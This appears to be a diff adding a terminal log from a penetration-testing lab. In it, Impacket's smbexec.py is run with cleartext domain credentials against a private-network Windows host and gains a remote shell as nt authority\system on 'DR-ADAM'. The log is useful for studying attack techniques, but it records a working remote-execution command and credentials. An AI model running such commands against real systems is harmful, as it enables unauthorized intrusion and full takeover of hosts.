@@ -1,0 +1,38 @@
+
+┌──(root㉿PJZ)-[/home/projectzeus]
+└─# smbexec.py spectra.local/dadam:Password1@192.168.177.129
+/usr/local/bin/smbexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.9.24.dev1+20210704.162046.29ad5792', 'smbexec.py')
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[-] [Errno Connection error (192.168.177.129:445)] [Errno 113] No route to host
+
+┌──(root㉿PJZ)-[/home/projectzeus]
+└─# smbexec.py spectra.local/dadam:Password1@192.168.177.129
+/usr/local/bin/smbexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.9.24.dev1+20210704.162046.29ad5792', 'smbexec.py')
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>help
+
+Documented commands (type help <topic>):
+========================================
+help
+
+Undocumented commands:
+======================
+CD  EOF  cd  exit  shell
+
+C:\Windows\system32>shell
+C:\Windows\system32> --help
+'--help' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+DR-ADAM
+
+C:\Windows\system32>
